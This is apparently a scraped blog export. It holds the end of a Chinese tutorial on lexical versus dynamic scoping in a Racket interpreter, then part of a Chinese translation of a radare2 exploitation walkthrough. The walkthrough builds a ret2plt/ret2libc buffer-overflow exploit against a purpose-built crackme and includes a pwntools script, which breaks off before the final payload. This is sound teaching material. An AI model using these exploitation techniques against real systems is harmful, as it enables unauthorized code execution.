绑定的值。 Lexical Scoping 和 Dynamic Scoping下面我们准备谈谈函数定义和调用。对函数的解释是一个微妙的问题，很容易弄错，这是由于函数体内也许会含有外层的变量，叫做“自由变量”。所以在分析函数的代码之前，我们来了解一下不同的“作用域”（scoping）规则。 我们举个例子来解释这个问题。下面这段代码，它的值应该是多少呢？ 1234(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))) 在这里，f 函数体 (lambda (y) (* x y)) 里的那个 x，就是一个“自由变量”。x 并不是这个函数的参数，也不是在这个函数里面定义的，所以我们必须到函数外面去找 x 的值。 我们的代码里面，有两个地方对 x 进行了绑定，一个等于 2，一个等于 4，那么 x 到底应该是指向哪一个绑定呢？这似乎无关痛痒，然而当我们调用 (f 3) 的时候，严重的问题来了。f 的函数体是 (* x y)，我们知道 y 的值来自参数 3，可是 x 的值是多少呢？它应该是 2，还是 4 呢？ 在历史上，这段代码可能有两种不同的结果，这种区别一直延续到今天。如果你在 Scheme （Racket）里面写以上的代码，它的结果是 6。 1234567;; Scheme(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3))));; =&gt; 6 现在我们来看看，在 Emacs Lisp 里面输入等价的代码，得到什么结果。如果你不熟悉 Emacs Lisp 的用法，那你可以跟我做：把代码输入 Emacs 的那个叫 scratch 的 buffer。把光标放在代码最后，然后按 C-x C-e，这样 Emacs 会执行这段代码，然后在 minibuffer 里显示结果： 结果是 12！如果你把代码最内层的 x 绑定修成其它的值，输出会随之改变。 奇怪吧？Scheme 和 Emacs Lisp，到底有什么不一样呢？实际上，这两种看似差不多的 “Lisp 方言”，采用了两种完全不同的作用域方式。Scheme 的方式叫做 lexical scoping （或者 static scoping），而 Emacs 的方式叫做 dynamic scoping。 那么哪一种方式更好呢？或者用哪一种都无所谓？答案是，dynamic scoping 是非常错误的做法。历史的教训告诉我们，它会带来许许多多莫名其妙的 bug，导致 dynamic scoping 的语言几乎完全没法用。这是为什么呢？ 原因在于，像 (let ((x 4)) …) 这样的变量绑定，只应该影响它内部“看得见”的 x 的值。当我们看见 (let ((x 4)) (f 3)) 的时候，并没有在 let 的内部看见任何叫“x” 的变量，所以我们“直觉”的认为，(let ((x 4)) …) 对 x 的绑定，不应该引起 (f 3) 的结果变化。 然而对于 dynamic scoping，我们的直觉却是错误的。因为 f 的函数体里面有一个 x，虽然我们没有在 (f 3) 这个调用里面看见它，然而它却存在于 f 定义的地方。要知道，f 定义的地方也许隔着几百行代码，甚至在另外一个文件里面。而且调用函数的人凭什么应该知道， f 的定义里面有一个自由变量，它的名字叫做 x？所以 dynamic scoping 在设计学的角度来看，是一个反人类的设计 :) 相反，lexical scoping 却是符合人们直觉的。虽然在 (let ((x 4)) (f 3)) 里面，我们把 x 绑定到了 4，然而 f 的函数体并不是在那里定义的，我们也没在那里看见任何 x，所以 f 的函数体里面的 x，仍然指向我们定义它的时候看得见的那个 x，也就是最上面的那个 (let ([x 2]) …)，它的值是 2。所以 (f 3) 的值应该等于 6，而不是 12。 对函数的解释为了实现 lexical scoping，我们必须把函数做成“闭包”（closure）。闭包是一种特殊的数据结构，它由两个元素组成：函数的定义和当前的环境。我们把闭包定义为一个 Racket 的 struct 结构： 1(struct Closure (f env)) 有了这个数据结构，我们对 (lambda (x) e) 的解释就可以写成这样： 12[`(lambda (,x) ,e) (Closure exp env)] 注意这里的 exp 就是 (lambda (,x) ,e)` 自己。 有意思的是，我们的解释器遇到 (lambda (x) e)，几乎没有做任何计算。它只是把这个函数包装了一下，把它与当前的环境一起，打包放到一个数据结构（Closure）里面。这个闭包结构，记录了我们在函数定义的位置“看得见”的那个环境。稍候在调用的时候，我们就能从这个闭包的环境里面，得到函数体内的自由变量的值。 对调用的解释好了，我们终于到了最后的关头，函数调用。为了直观，我们把函数调用的代码拷贝如下： 123456[`(,e1 ,e2) (let ([v1 (interp e1 env)] ; 计算函数 e1 的值 [v2 (interp e2 env)]) ; 计算参数 e2 的值 (match v1 [(Closure `(lambda (,x) ,e) env-save) ; 用模式匹配的方式取出闭包里的各个子结构 (interp e (ext-env x v2 env-save))]))] ; 在闭包的环境env-save中把x绑定到v2，解释函数体 函数调用都是 (e1 e2) 这样的形式，e1 表示函数，e2 是它的参数。我们需要先分别求出函数 e1 和参数 e2 的值。 函数调用就像把一个电器的插头插进插座，使它开始运转。比如，当 (lambda (x) (_ x 2)) 被作用于 1 时，我们把 x 绑定到 1，然后解释它的函数体 (_ x 2)。但是这里有一个问题，函数体内的自由变量应该取什么值呢？从上面闭包的讨论，你已经知道了，自由变量的值，应该从闭包的环境查询。 操作数 e1 的值 v1 是一个闭包，它里面包含一个函数定义时保存的环境 env-save。我们把这个环境 env-save 取出来，那我们就可以查询它，得到函数体内自由变量的值。然而函数体内不仅有自由变量，还有对函数参数的使用，所以我们必须扩展这个 env-save 环境，把参数的值加进去。这就是为什么我们使用 (ext-env x v2 env-save)，而不只是 env-save。 你可能会奇怪，那么解释器的环境 env 难道这里就不用了吗？是的。我们通过 env 来计算 e1 和 e2 的值，是因为 e1 和 e2 里面的变量，在“当前环境”（env）里面看得见。可是函数体的定义，在当前环境下是看不见的。它的代码在别的地方，而那个地方看得见的环境，被我们存在闭包里了，它就是 env-save。所以我们把 v1 里面的闭包环境 env-save 取出来，用于计算函数体的值。 有意思的是，如果我们用 env，而不是 env-save 来解释函数体，那我们的语言就变成了 dynamic scoping。现在来实验一下：你可以把 (interp e (ext-env x v2 env-save)) 里面的 env-save 改成 env，再试试我们之前讨论过的代码，它的输出就会变成 12。那就是我们之前讲过的，dynamic scoping 的结果。 1234567(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 12 你也许发现了，如果我们的语言是 dynamic scoping，那就没必要使用闭包了，因为我们根本不需要闭包里面保存的环境。这样一来，dynamic scoping 的解释器就可以写成这样： 123456789101112131415(define interp (lambda (exp env) (match exp ... ... [`(lambda (,x) ,e) ; 函数：直接返回自己的表达式 exp] ... ... [`(,e1 ,e2) (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [`(lambda (,x) ,e) ; 调用：直接使用函数的表达式本身 (interp e (ext-env x v2 env))]))] ... ...))) 注意到这个解释器的函数有多容易实现吗？它就是这个函数的表达式自己，原封不动。用函数的表达式本身来表示它的值，是很直接很简单的做法，也是大部分人一开头就会想到的。然而这样实现出来的语言，就不知不觉地采用了 dynamic scoping。 这就是为什么很多早期的 Lisp 语言，比如 Emacs Lisp，都使用 dynamic scoping。这并不是因为它们的设计者在 dynamic scoping 和 lexical scoping 两者之中做出了选择，而是因为使用函数的表达式本身来作为它的值，是最直接，一般人都会首先想到的做法。 另外，在这里我们也看到环境用“函数式数据结构”表示的好处。闭包被调用时它的环境被扩展，但是这并不会影响原来的那个环境，我们得到的是一个新的环境。所以当函数调用返回之后，函数的参数绑定就自动“注销”了。 如果你用一个非函数式的数据结构，在绑定参数时不生成新的环境，而是对已有环境进行赋值，那么这个赋值操作就会永久性的改变原来环境的内容。所以你在函数返回之后必须删除参数的绑定。这样不但麻烦，而且在复杂的情况下很容易出错。 思考题：可能有些人看过 lambda calculus，这些人可能知道 (let ([x e1]) e2) 其实等价于一个函数调用：((lambda (x) e2) e1)。现在问题来了，我们在讨论函数和调用的时候，很深入的讨论了关于 lexical scoping 和 dynamic scoping 的差别。既然 let 绑定等价于一个函数定义和调用，为什么之前我们讨论对绑定的时候，没有讨论过 lexical scoping 和 dynamic scoping 的问题，也没有制造过闭包呢？ 不足之处现在你已经学会了如何写出一个简单的解释器，它可以处理一个相当强大的函数式语言。出于教学的考虑，这个解释器并没有考虑实用的需求，所以它并不能作为工业应用。在这里，我指出它的一些不足之处。 缺少必要的语言构造。我们的语言里缺少好些实用语言必须的构造：递归，数组，赋值操作，字符串，自定义数据结构，…… 作为一篇基础性的读物，我不能把这些都加进来。如果你对这些有兴趣，可以看看其它书籍，或者等待我的后续作品。 不合法代码的检测和报告。你也许发现了，这个解释器的 match 表达式，全都假定了输入都是合法的程序，它并没有检查不合法的情况。如果你给它一个不合法的程序，它不会马上报错，而是会真去算它，以至于导致奇怪的后果。一个实用的解释器，必须加入对代码格式进行全面检测，在运行之前就报告不合法的代码结构。 低效率的数据结构。在 association list 里面查找变量，是线性的复杂度。当程序有很多变量的时候就有性能问题。一个实用的解释器，需要更高效的数据结构。这种数据结构不一定非得是函数式的。你也可以用非函数式的数据结构（比如哈希表），经过一定的改造，达到同样的性质，却具有更高的效率。 ​ 另外，你还可以把环境转化成一个数组。给环境里的每个变量分配一个下标（index），在这个数组里就可以找到它的值。如果你用数组表示环境，那么这个解释器就向编译器迈进了一步。 S 表达式的歧义问题。为了教学需要，我们的解释器直接使用 S 表达式来表达语法树，用模式匹配来进行分支遍历。在实际的语言里，这种方式会带来比较大的问题。因为 S 表达式是一种通用的数据结构，用它表示的东西，看起来都差不多的样子。一旦程序的语法构造多起来，直接对 S 表达式进行模式匹配，会造成歧义。 ​ 比如 (,op ,e1 ,e2) ，你以为它只匹配二元算术操作，比如 (+ 1 2)。但它其实也可以匹配一个 let 绑定： (let ([x 1]) (* x 2))。这是因为它们顶层元素的数目是一样的。为了消除歧义，你得小心的安排模式的顺序，比如你必须把 (let ([,x ,e1]) ,e2) 的模式放在 (,op ,e1, e2) 前面。所以最好的办法，是不要直接在 S 表达式上写解释器，而是先写一个“parser”，这个 parser 把 S 表达式转换成 Racket 的 struct 结构。然后解释器再在 struct 上面进行分支匹配。这样解释器不用担心歧义问题，而且会带来效率的提升。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"blog.b3ale.cn/tags/repost/"}]},{"title":"【译】Radare2之旅-Part2：Exploitation","slug":"【译】Radare2之旅-Part2：Exploitation","date":"2019-02-23T03:18:10.000Z","updated":"2019-08-26T01:14:04.086Z","comments":true,"path":"2019/02/23/【译】Radare2之旅-Part2：Exploitation/","link":"","permalink":"blog.b3ale.cn/2019/02/23/【译】Radare2之旅-Part2：Exploitation/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言欢迎来到我们radare2之旅的第二部分！在这一部分，我们会涵盖radare2的更多部分，同时这次更注重于二进制漏洞挖掘。 相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的第一部分，我非常推荐你去读一读。第一部分记录了radare2的基础内容，同时也解释了很多我今天会用到的命令。 在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。radare2有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找 ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用radare2来绕过在开启ASLR的系统上运行并且有NX保护的程序。我假设大家都已经掌握了以下的预备知识： 汇编语言 程序保护技术（NX、ASLR） 栈帧结构 缓冲区溢出 面向返回编程 x86 调用约定 熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。 更新radare2首先，我们将radare2更新至其 git 的最新版版： 123$ git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话$ cd radare2$ ./sys/install.sh 等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。 熟悉程序你可以在这里下载程序，在这里下载源码。如果你想自己编译程序，用以下命令： 1$ gcc -m32 -fno-stack-protector megabeets_0x2.c -o megabeets_0x2 这次的程序与上一次的程序非常相似，只是在main()函数中有一些细微的改变： 编译时不使用参数-z execstac来开启NX 通过 scanf 来接收用户的输入，而不是通过程序的参数 大部分输出的函数为 puts 对程序的输出做了一点修改 这是之前的main()函数： 12345678910111213int main(int argc, char *argv[])&#123; printf(\"\\n .:: Megabeets ::.\\n\"); printf(\"Think you can make it?\\n\"); if (argc &gt;= 2 &amp;&amp; beet(argv[1])) &#123; printf(\"Success!\\n\\n\"); &#125; else printf(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 然后现在的main函数是这样的： 12345678910111213141516int main(int argc, char *argv[])&#123; char *input; puts(\"\\n .:: Megabeets ::.\\n\"); puts(\"Show me what you got:\"); scanf(\"%ms\", &amp;input); if (beet(input)) &#123; printf(\"Success!\\n\\n\"); &#125; else puts(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过rot13加密的字符串Megabeets比较。故输入应该为Zrtnorrgf。 123456789101112131415$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:blablablablaNop, Wrong argument.$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:ZrtnorrgfSuccess! 这些都很简单，但是我们今天的重点并不是破解一个简单的 crackme，而是对其进行漏洞利用。那我们开始吧！ 理解漏洞对于每一个 PWN 题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的rabin2，或者直接在radare2的 shell 里执行i命令。因为我们还没有用radare2打开文件，就先用rabin2来看看： 1234567891011121314151617181920212223242526272829$ rabin2 -I megabeets_0x2arch x86binsz 6072bintype elfbits 32canary falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true 在标记的几行中，我们可以看到程序开了NX，也就是说栈是不可执行的。还有，该程序没有开启Canary、PIC或是RELRO。 现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用radare2的调试模式打开程序： 12345678$ r2 -d megabeets_0x2Process with PID 20859 started…= attach 20859 20859bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32– Your endian swaps[0xf7782b30]&gt; aas -d – 用调试模式打开 aas – 分析函数、符号以及其他 注意：正如我在前一篇文章所提到的，开始时使用aaa分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在这篇回答里写了更多——读一下也许会让你的理解更深。 现在我们继续执行程序，直到main函数。只要输入命令dcu main： 12345678[0xf7797b30]&gt; dcu?|Usage: dcu Continue until address| dcu address Continue until address| dcu [..tail] Continue until the range| dcu [from] [to] Continue until the range[0xf7797b30]&gt; dcu mainContinue until 0x08048658 using 1 bpsizehit breakpoint at: 8048658 dcu代表debug continue until 现在让我们输入VV进入图形模式。在第一部分解释过，你可以通过p和P切换视角，通过k/j/h/l分别向上/下/左/右移动，通过g和调用旁的字母跳转函数（例如gd）。 用?来列出所有在图形模式下的命令，同时别忘记R命令 😉 main()函数是程序要求我们输入的地方，并且它将输入传给sym.beet。通过gc我们跳转到处理我们输入的beet()函数： 我们可以看到用户的输入[arg_8h]被复制给一个缓冲区（[local_88h]），然后就是我们在前一篇文章中所看到过的，字符串Megabeets用rot13加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。 你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。 规划漏洞利用脚本既然我们已经找到了有漏洞的函数，我们需要构造一个 payload 来利用它。我们的目标很明了，就是在系统上成功开一个 shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的 payload 可以覆盖栈的偏移。 我们将会使用一个radare2框架中的工具，叫做ragg2。它能够为我们生成一段循环的德布鲁因序列，用来检测覆盖缓冲区的确切的偏移大小。 123456789$ ragg2 -&lt;truncated&gt; -P [size] prepend debruijn pattern&lt;truncated&gt; -r show raw bytes instead of hexpairs&lt;truncated&gt;$ ragg2 -P 100 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh 我们知道我们的程序通过输入流读取我们的输入，而不是从 shell 中读取我们的输入。故我们将会使用又一个来自radare2工具箱中的工具，rarun2。 rarun2可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如stdin） 如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。 我们需要做以下的三个步骤： 使用ragg2将德布鲁因序列写入一个文件 新建一个rarun2配置文件，并且把前一个文件作为stdin 让radare2来找到偏移 12345678910111213141516171819202122232425262728$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txtAAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt$ r2 -r profile.rr2 -d megabeets_0x2Process with PID 21663 started…= attach 21663 21663bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— Use rarun2 to launch your programs with a predefined environment.[0xf77c2b30]&gt; dcSelecting and continuing: 21663.:: Megabeets ::.Show me what you got?child stopped with signal 11[0x41417641]&gt; 我们运行程序，并将pattern.txt的内容用rarun2传给stdin，SIGSEV 11。 一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。 SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。 你发现了吗？我们实时的指针现在指向了0x41417641。这是一个无效的地址，它表示了字符串AvAA（小端序及 ascii 码转换），也就是我们送的字符串的一部分。radare2允许我们找到给出的值在德布鲁因序列中的偏移。 123456[0x41417641]&gt; wop?|Usage: wop[DO] len @ addr | value| wopD len [@ addr] Write a De Bruijn Pattern of length ‘len’ at address ‘addr’| wopO value Finds the given value into a De Bruijn Pattern at current offset[0x41417641]&gt; wopO `dr eip`140 既然我们已经知道需要覆盖返回地址的偏移为 140，我们可以开始编写脚本了。 编写漏洞利用脚本我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示radare2在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。 我们的目标是在系统中产生一个 shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了ASLR地环境下，所以我们不能猜测到libc在内存中的地址。那就可以和ret2libc说再见了。另外，程序开了NX，这意味栈是不可执行的，所以我们不能直接在栈上放一个shellcode然后跳过去。 虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。 让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库： 123456789101112$ r2 -d megabeets_0x2Process with PID 23072 started…= attach 23072 23072bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— You haxor! Me jane?[0xf7763b30]&gt; il[Linked libraries]libc.so.61 library il表示Information libraries，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的libc。 现在通过执行ii命令——Information Imports，让我们看看导入的函数。我们可以加上q来减少冗长的输出： 12345678910111213141516[0xf7763b30]&gt; ii[Imports]ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmpordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpyordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=putsordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_mainordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports[0xf7763b30]&gt; iiqstrcmpstrcpyputs__gmon_start____libc_start_main__isoc99_scanf 计划 泄漏puts的真实地址 计算libc的基址 计算system的地址 在libc中找到包含字符串/bin/sh的地址 调用system(&quot;/bin/sh&quot;)打开一个 shell 泄漏puts的地址我们需要用到ret2plt来泄漏puts的真实地址。PLT（Procedure Linkage Table）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在.text段看到CALL指令，并不是直接跳到函数。实际上，它跳转到了PLT中的一小段代码，像是func_name@plt这样。这一小段代码跳转到GOT（Global Offset Table）中的列出的该函数的地址。GOT表入口点会指回PLT，同时PLT会调用一个动态链接器来确定该函数的真实地址。下一次调用func_name@plt时，这段代码会直接跳转到GOT表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的这一系列关于链接器的文章 为了达到这个目的，我们需要找到puts在PLT以及GOT中的地址，然后调用puts@plt并且把puts@got作为参数。我们将把这些调用连在一起，在scanf时传给程序。然后我们会返回到我们利用的第二个阶段。puts将会把它真实的地址输出出来。 12345678+---------------------+| Stage 1 |+---------------------+| padding (140 bytes) || puts@plt || entry_point || puts@got |+---------------------+ 编写脚本我们需要使用pwnlib框架，而且它是我最喜欢的 python 漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。 使用pip下载pwntools： 12$ pip install --upgrade pip$ pip install --upgrade pwntools 你可以在官方文档上了解更多关于pwntools。 这是我们第一阶段的 python 脚本： 123456789101112131415161718192021222324252627282930313233343536from pwn import *# Addressesputs_plt =puts_got =entry_point =# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 # padding ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean()if __name__ == \"__main__\": main() 我们需要填充puts@plt和puts@got的地址，以及程序的入口点。让我们回到radare2并执行以下命令。字符#用于注释，字符~是radare2的 shell 中的内置grep。 123456789[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts0x08048390[0xf7763b30]&gt; # the address of puts@got:[0xf7763b30]&gt; ?v reloc.puts_200x0804a014[0xf7763b30]&gt; # the address of program’s entry point (entry0):[0xf7763b30]&gt; ieq0x080483d0 sym.imp.puts和reloc.puts_20是radare2自动检测到的标志。命令ie表示Information Entrypoint。 现在我们填入我们找到的地址： 12345678...# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0... 我们执行一下脚本： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23578[*] puts is at: 0xf75db710[*] Stopped process ‘./megabeets_0x2’ (pid 23578)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23592[*] puts is at: 0xf7563710[*] Stopped process ‘./megabeets_0x2’ (pid 23592)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23606[*] puts is at: 0xf75e3710[*] Stopped process ‘./megabeets_0x2’ (pid 23606) 我执行了脚本三次，puts的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到puts在libc中的偏移，然后计算出libc的基址。在我们找到基址后，我们可以用偏移计算出system、exit以及字符串/bin/sh的地址。 现在我们的脚本应该是这样： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts =offset_system =offset_str_bin_sh =offset_exit =# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system binsh_addr = libc_base + offset_str_bin_sh exit_addr = libc_base + offset_exit log.info(\"system: 0x%x\" % system_addr) log.info(\"binsh: 0x%x\" % binsh_addr) log.info(\"exit: 0x%x\" % exit_addr)if __name__ == \"__main__\": main() 计算真实地址请注意在文章的这部分，我的结果可能与你的不同。因为我们的 libc 版本不同，所以会产生不同的偏移。 首先我们需要找到puts在libc上的偏移。我们再一次打开radare2，继续执行到入口点。做以上步骤的原因是我们在libc载入之前开始调试程序，直到入口点时，运行库才全部加载完。 我们使用dmi命令，将libc和函数作为参数。我加上了~来显示相关的信息。 123456789101112131415161718192021$ r2 -d megabeets_0x2Process with PID 24124 started…= attach 24124 24124bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens[0xf771ab30]&gt; dcu entry0Continue until 0x080483d0 using 1 bpsizehit breakpoint at: 80483d0[0x080483d0]&gt; dmi libc puts~ puts$vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts[0x080483d0]&gt; dmi libc system~ system$vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system[0x080483d0]&gt; dmi libc exit~ exit$vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit 请注意，在这篇文章发表前，dmi的输出格式就已经改变了。你的结果很有可能与我的有所不同。 所有这些paddr=0x000xxxxx是函数在libc上的偏移。现在我们需要在程序中找到/bin/sh的位置。我们将要使用radare2的一些搜索功能。radare2默认在dbg.map，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成： 1[0x080483d0]&gt; e search.in = dbg.maps 你可以执行e search.in=?查看更多选项。执行Ve配置可视化模式 在radare2中通过/命令查找。让我们看看radare2给我们提供的查找参数： 123456789101112131415161718192021222324252627282930313233|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)| / foo\\x00 search for string ‘foo\\0’| /j foo\\x00 search for string ‘foo\\0’ (json output)| /! ff search for first occurrence not matching| /+ /bin/sh construct the string with chunks| /!x 00 inverse hexa search (find first byte != 0x00)| // repeat last search| /h[t] [hash] [len] find block matching this hash. See /#?| /a jmp eax assemble opcode and search its bytes| /A jmp find analyzed instructions of this type (/A? for help)| /b search backwards| /B search recognized RBin headers| /c jmp [esp] search for asm code| /C[ar] search for crypto materials| /d 101112 search for a deltified sequence of bytes| /e /E.F/i match regular expression| /E esil-expr offset matching given esil expressions %%= here| /f file [off] [sz] search contents of file with offset and size| /i foo search for string ‘foo’ ignoring case| /m magicfile search for matching magic file (use blocksize)| /o show offset of previous instruction| /p patternsize search for pattern of given size| /P patternsize search similar blocks| /r[e] sym.printf analyze opcode reference an offset (/re for esil)| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated| /v[1248] value look for an cfg.bigendian 32bit value| /V[1248] min max look for an cfg.bigendian 32bit value in range| /w foo search for wide string ‘f\\0o\\0o\\0’| /wi foo search for wide string ignoring case ‘f\\0o\\0o\\0’| /x ff..33 search for hex string ignoring some nibbles| /x ff0033 search for hex string| /x ff43 ffd0 search for hexpair with mask| /z min max search for strings of given size 提供给我们了许多不同的方式。同时还发心/R能够帮助我们查找 ROP。可惜这篇文章里我们没有打算使用 ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。 我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前libc载入的地址，然后计算出/bin/sh的偏移。 12345678910[0x080483d0]&gt; / /bin/shSearching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68Searching 7 bytes in [0x8048000-0x8049000]hits: 0Searching 7 bytes in [0x8049000-0x804a000]hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]hits: 0Searching 7 bytes in [0xffd2f000-0xffd50000]hits: 00xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica. r2在内存中找到了/bin/sh。现在我们计算它相对libc基址的偏移： 1234[0x080483d0]&gt; dmm~libc0xf7599000 /usr/lib32/libc-2.25.so[0x080483d0]&gt; ?X 0xf7700768-0xf7599000167768 我们发现/bin/sh相对libc基址的偏移为0x167768。我们把它填进脚本中，并且可以开始我们的最后一个步骤。 123456789...# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768... 获取 shell漏洞利用的第二阶段很直接。我们继续使用 140 个字符，然后调用system并将/bin/sh作为参数，最后exit。 12345678+---------------------+| Stage 2 |+---------------------+| padding (140 bytes) || system@libc || exit@libc || /bin/sh address |+---------------------+ 还记得上一次我们返回到了入口点吗？这意味着scanf又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。 这是我们最后的脚本。像我之前所说的，你只需要替换符合你的libc的偏移。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system exit_addr = libc_base + offset_exit binsh_addr = libc_base + offset_str_bin_sh log.info(\"system is at: 0x%x\" % system_addr) log.info(\"/bin/sh is at: 0x%x\" % binsh_addr) log.info(\"exit is at: 0x%x\" % exit_addr) # Build 2nd payload payload2 = \"A\"*140 ropchain2 = 